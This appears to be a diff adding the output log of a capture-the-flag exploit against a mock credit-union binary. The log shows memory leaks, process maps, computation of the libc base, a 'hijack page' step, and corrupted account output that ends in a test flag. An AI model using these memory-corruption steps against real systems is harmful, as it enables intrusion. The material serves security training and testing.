@@ -1,0 +1,51 @@
+[+] logged in
+[+] 9 records opened
+[+] 9 records closed
+[mem 0x406018] b'\xa0C\xc4E8y\x00\x00\xe0S\xddE8y\x00\x00@\x19\xc2E8y\x00\x00f\x10@\x00\x00\x00\x00\x00v\x10@\x00\x00\x00\x00\x00\x00h\xddE8y\x00\x00'
+[mem 0x406300] b' b@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xea\x00\x00\x00\x01\x00\x19\x00\x10a@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x01\x00\x1a\x00'
+[mem 0x406340] b'\xf6\x00\x00\x00\x01\x00\x1a\x00\x80b@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xfe\x00\x00\x00\x02\x00\x0e\x00\xd6\x12@\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00'
+[*] 9 balances: ['0x52a9a0bce3e25fc4', '0x52a9a0bce3e25fc4', '0x52a9a0bce3e25fc4', '0x52a9a0bce3e25fc4', '0x52a9a0bce3e25fc4', '0x52a9a0bce3e25fc4', '0x52a9a0bce3e25fc4', '0x793845db9ce0', '0x0']
+[+] maps:
+    00400000-00401000 r--p 00000000 00:46 2814749767798338                   /lab/ccu_premium
+    00401000-00403000 r-xp 00001000 00:46 2814749767798338                   /lab/ccu_premium
+    00403000-00405000 r--p 00003000 00:46 2814749767798338                   /lab/ccu_premium
+    00405000-00406000 r--p 00004000 00:46 2814749767798338                   /lab/ccu_premium
+    00406000-00407000 rw-p 00005000 00:46 2814749767798338                   /lab/ccu_premium
+    555572c92000-555572cb3000 rw-p 00000000 00:00 0                          [heap]
+    793845b9c000-793845b9f000 rw-p 00000000 00:00 0 
+    793845b9f000-793845bc7000 r--p 00000000 00:46 3096224744508995           /lab/libc.so.6
+    793845bc7000-793845d5c000 r-xp 00028000 00:46 3096224744508995           /lab/libc.so.6
+    793845d5c000-793845db4000 r--p 001bd000 00:46 3096224744508995           /lab/libc.so.6
+    793845db4000-793845db5000 ---p 00215000 00:46 3096224744508995           /lab/libc.so.6
+    793845db5000-793845db9000 r--p 00215000 00:46 3096224744508995           /lab/libc.so.6
+    793845db9000-793845dbb000 rw-p 00219000 00:46 3096224744508995           /lab/libc.so.6
+    793845dbb000-793845dc8000 rw-p 00000000 00:00 0 
+    793845dc8000-793845dca000 r--p 00000000 00:46 3096224744508997           /lab/libseccomp.so.2
+    793845dca000-793845dd8000 r-xp 00002000 00:46 3096224744508997           /lab/libseccomp.so.2
+    793845dd8000-793845de5000 r--p 00010000 00:46 3096224744508997           /lab/libseccomp.so.2
+    793845de5000-793845de6000 ---p 0001d000 00:46 3096224744508997           /lab/libseccomp.so.2
+    793845de6000-793845de7000 r--p 0001d000 00:46 3096224744508997           /lab/libseccomp.so.2
+    793845de7000-793845de8000 rw-p 0001e000 00:46 3096224744508997           /lab/libseccomp.so.2
+    793845de8000-793845dea000 rw-p 00000000 00:00 0 
+    793845dea000-793845dee000 r--p 00000000 00:00 0                          [vvar]
+    793845dee000-793845df0000 r--p 00000000 00:00 0                          [vvar_vclock]
+    793845df0000-793845df2000 r-xp 00000000 00:00 0                          [vdso]
+    793845df2000-793845df4000 r--p 00000000 00:46 3096224744508996           /lab/ld-linux-x86-64.so.2
+    793845df4000-793845e1e000 r-xp 00002000 00:46 3096224744508996           /lab/ld-linux-x86-64.so.2
+    793845e1e000-793845e29000 r--p 0002c000 00:46 3096224744508996           /lab/ld-linux-x86-64.so.2
+    793845e2a000-793845e2c000 r--p 00037000 00:46 3096224744508996           /lab/ld-linux-x86-64.so.2
+    793845e2c000-793845e2e000 rw-p 00039000 00:46 3096224744508996           /lab/ld-linux-x86-64.so.2
+    7ffd7f89c000-7ffd7f8bd000 rw-p 00000000 00:00 0                          [stack]
+[+] libc map base = 0x793845b9f000   heap map base(s) = ['0x555572c92000']
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x52a9a0bce3e25fc4  -> libc+0x52a927849e286fc4  heap+0x52a94b6771193fc4
+      leak 0x793845db9ce0  -> libc+0x21ace0  heap+0x23e2d3127ce0
+      leak 0x0  -> libc+-0x793845b9f000  heap+-0x555572c92000
+[*] libc base = 0x793845b9f000
+[+] memo (hijack page) filed
+[out] b'\n\x1b[31m------------------------------------------------------------\x1b[0m\n PORTFOLIO SUMMARY - MEMBER 8802 (C. THOMPSON)\n TIER PREMIUM / PRIVATE CLIENT\n R. OKONKWO, RELATIONSHIP OFFICER\n\x1b[31m------------------------------------------------------------\x1b[0m\n  1) RECORD 1431776405  TYPE 5          SHARE SAVINGS  CLOSED\n     NICKNAME : \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n     BALANCE  : $59,564,687,153,117,511.08\n     PROJECTED PERIOD DIVIDEND : 595646871531175.12\n  2) RECORD 664695189   TYPE 21840      SHARE DRAFT    CLOSED\n     NICKNAME : \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n     BALANCE  : $59,564,687,153,117,511.08\n     PROJECTED PERIOD DIVIDEND : 595646871531175.12\n  3) RECORD 664695302   TYPE 21840      SHARE DRAFT    CLOSED\n     NICKNAME : \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n     BALANCE  : $59,564,687,153,117,511.08\n     PROJECTED PERIOD DIVIDEND : 595646871531175.12\n  4) RECORD 664685750   TYPE 21840      SHARE DRAFT    CLOSED\n     NICKNAME : \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n     BALANCE  : $59,564,687,153,117,511.08\n     PROJECTED PERIOD DIVIDEND : 595646871531175.12\n  5) RECORD 664685862   TYPE 21840      SHARE DRAFT    CLOSED\n     NICKNAME : \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n     BALANCE  : $59,564,687,153,117,511.08\n     PROJECTED PERIOD DIVIDEND : 595646871531175.12\n  6) RECORD 664686550   TYPE 21840      SHARE DRAFT    CLOSED\n     NICKNAME : \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n     BALANCE  : $59,564,687,153,117,511.08\n     PROJECTED PERIOD DIVIDEND : 595646871531175.12\n  7) RECORD 1169986533  TYPE 31032      SHARE DRAFT    CLOSED\n     NICKNAME : Q\xae\xbcE8y\x00\x00\x00c@\x00\x00\x00\x00\x00\xb0N\xbeE8y\x00\x00\n     BALANCE  : $0.00\n/flag\x00\x00\x00cdctf{LOCAL_TEST_FLAG_abc123}\n\x0e\x00\xd6\x12@\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x02\x00\x0e\x00\x07\x13@\x00\x00\x00\x00\x00'
